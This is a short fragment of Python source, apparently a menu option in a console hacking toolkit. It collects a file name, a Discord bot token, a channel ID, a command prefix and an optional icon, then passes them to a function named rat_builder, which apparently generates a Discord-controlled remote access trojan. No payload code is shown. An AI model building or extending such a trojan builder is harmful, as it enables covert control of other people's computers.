    elif choice in ["9", "09"]:
        clear.clear()
        filename = input(RED + "[INPUT] Enter the name you want for the file : ")
        channel_id = input(RED + "[INPUT] Enter the id of the main channel : ")
        bot_token = input(RED + "[INPUT] Enter your Discord bot token : ")
        while True:
            prefix = input(RED + "[INPUT] Enter the prefix you want for your bot : ")
            if prefix not in [".", "+", "/", "&", "$", "!", "?"]:
                clear.clear()
                invalid_prefix = input(RED + "[ERROR] Please enter a valid prefix ! To see the list of the valid prefix, enter ?, to continue juste press ENTER : ")
                if invalid_prefix == "?":
                    clear.clear()
                    print(RED + f'ALL VALID PREFIX : {RST} ".", "+", "/", "&", "$", "!", "?"')
                    input(RED + "\n[INPUT] Press ENTER to continue... ")
                    clear.clear()
            else:
                break

        icon_or_not = input(RED + "[INPUT] Do you want an icon ? ONLY .ICO files ! (y/n) : ")
        if icon_or_not in ["y", "Y", "Yes", "yes", "YES"]:
            icon = input(RED + "[INPUT] Enter the full path of your .ico file : ")
        else:
            icon = False
        
        clear.clear()
        print(RED + f"[INFO] Processing...")
        rat_builder(filename, prefix, bot_token, channel_id, icon)
        clear.clear()
